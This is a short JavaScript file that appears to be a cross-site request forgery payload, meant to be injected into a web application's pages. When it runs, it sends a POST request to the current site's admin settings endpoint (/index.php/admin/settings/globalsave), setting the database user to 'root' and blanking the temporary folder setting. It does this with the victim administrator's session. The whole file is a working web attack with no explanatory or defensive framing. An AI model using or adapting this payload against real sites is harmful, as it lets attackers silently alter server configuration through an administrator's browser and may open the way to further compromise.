var target = document.location.host;


function csrfPostReq(){
	var xhttp = new XMLHttpRequest();
	xhttp.open("POST", "http://" + target + "/index.php/admin/settings/globalsave", true);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send("save=1&fields[sql_user]=root&fields[tmpFolderBaseName]=");
}


csrfPostReq();
